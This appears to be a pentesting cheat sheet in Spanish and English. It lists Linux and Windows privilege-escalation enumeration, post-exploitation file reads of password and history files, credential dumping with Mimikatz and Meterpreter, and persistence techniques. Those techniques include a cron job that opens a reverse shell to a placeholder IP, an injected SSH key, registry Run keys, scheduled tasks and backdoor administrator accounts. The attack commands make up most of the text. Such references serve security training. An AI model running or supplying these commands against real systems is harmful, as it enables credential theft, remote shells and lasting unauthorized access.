# Privilege Escalation

## Linux Privilege Escalation

### Enumeración Básica

```bash
id && whoami
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/crontab
ps aux | grep root
```

---

### Herramientas

- LinPEAS
- LinEnum
- Linux Smart Enumeration

---

### Técnicas Comunes

```
1. SUID binaries
2. Sudo misconfiguration
3. Kernel exploits
4. Capabilities
5. Cron jobs
```

---

## Windows Privilege Escalation

### Enumeración Básica

```cmd
whoami /all
systeminfo
sc query
wmic service list brief
```

---

### Herramientas

- WinPEAS
- PowerUp
- Seatbelt

---

### Técnicas Comunes

```
1. Unquoted Service Paths
2. AlwaysInstallElevated
3. Kernel exploits
4. Service permissions
5. Registry AutoRuns
```

---

# Post-Explotación

## Recolección de Información

### Linux

```bash
cat /etc/passwd
cat ~/.bash_history
find / -name "*password*" 2>/dev/null
```

---

### Windows

```cmd
dir /s /b C:\*password*
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
cmdkey /list
```

---

## Dump de Credenciales

### Mimikatz

```
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

---

### Meterpreter

```
hashdump
load kiwi
creds_all
```

---

## Lateral Movement

```
• Pass-the-Hash
• Pass-the-Ticket
• Pivoting
• Port Forwarding
```

---

# Persistencia

## Linux

```bash
# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'" | crontab -

# SSH keys
echo "ssh-rsa KEY" >> ~/.ssh/authorized_keys

# Backdoor user
useradd -m backdoor
echo "backdoor:pass" | chpasswd
```

---

## Windows

```cmd
# Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Scheduled task
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon

# Backdoor user
net user backdoor Password123! /add
net localgroup administrators backdoor /add
```